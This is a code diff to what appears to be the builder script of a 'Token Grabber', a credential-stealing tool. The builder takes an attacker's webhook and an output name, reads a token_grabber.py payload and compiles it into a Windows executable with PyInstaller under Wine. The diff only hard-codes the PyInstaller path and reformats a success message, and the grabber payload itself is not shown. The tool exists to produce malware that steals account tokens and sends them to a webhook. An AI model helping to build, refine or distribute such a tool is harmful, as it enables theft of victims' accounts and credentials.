@@ -9,8 +9,7 @@ class Builder:
         self.webhook = webhook
         self.out_file = out_file
         self.os = os
-        if self.os == "Linux":
-            self.path_to_pyinstaller = os.path.expanduser('~/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Scripts/pyinstaller.exe')
+        self.path_to_pyinstaller = "/root/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Scripts/pyinstaller.exe"
 
     def build(self):        
         f = open("code/token_grabber.py", 'r')
@@ -93,6 +92,6 @@ else:
     try:
         print("\n[+] Generating Token Grabber, please wait...")
         Builder(webhook, out_file, OS).build()
-        print("\n\n[+] Succesfully Generated Token Grabber\n[+]You can find it inside the dist directory")
+        print("\n\n[+] Succesfully Generated Token Grabber\n\n[+] You can find it inside the dist directory")
     except Exception as e:
         print(f"\n[-] An ERROR has occurred:\n{e}")
